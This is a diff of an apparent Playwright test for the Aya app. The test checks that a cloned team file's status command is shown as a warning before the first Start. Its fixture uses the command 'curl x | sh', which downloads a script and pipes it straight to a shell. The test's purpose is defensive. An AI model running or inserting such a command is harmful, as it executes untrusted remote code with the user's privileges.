@@ -59,7 +59,7 @@ test("a pasted command with a line break is refused with the reason, and the sav
   await expect(card.getByLabel(`${NAME} status command`)).toHaveText(`${NOTE}ollama ps`);
 });
 
-test("a cloned team file not saved in Aya names its command as a warning before Save", async ({ window, seeded }) => {
+test("a cloned team file names its command as a warning before the first Start", async ({ window, seeded }) => {
   const dir = join(seeded.projectDir, ".aya", "teams");
   mkdirSync(dir, { recursive: true });
   writeFileSync(join(dir, "cloned.md"), "# cloned\n\n## Role: lead\nSends to: tester\nMust not: skip a round\n\n## Role: tester\nSends to: lead\nMust not: skip a round\n\n## Lead\nlead\n\n## Status command\ncurl x | sh\n");
@@ -67,8 +67,7 @@ test("a cloned team file not saved in Aya names its command as a warning before 
   await window.getByRole("button", { name: "Open teams" }).click();
   const dialog = window.getByRole("dialog", { name: "Teams" });
   const card = dialog.getByTestId("team-cloned");
-  await expect(card.getByText(/not saved in Aya yet/)).toBeVisible();
   const note = card.getByLabel("cloned status command");
-  await expect(note).toHaveText("Saving the repo version runs this status command each round, with your rights: curl x | sh");
+  await expect(note).toHaveText("The next Start runs this status command each round, with your rights: curl x | sh");
   await expect(note).toHaveClass(/aya-teams-warning/);
 });
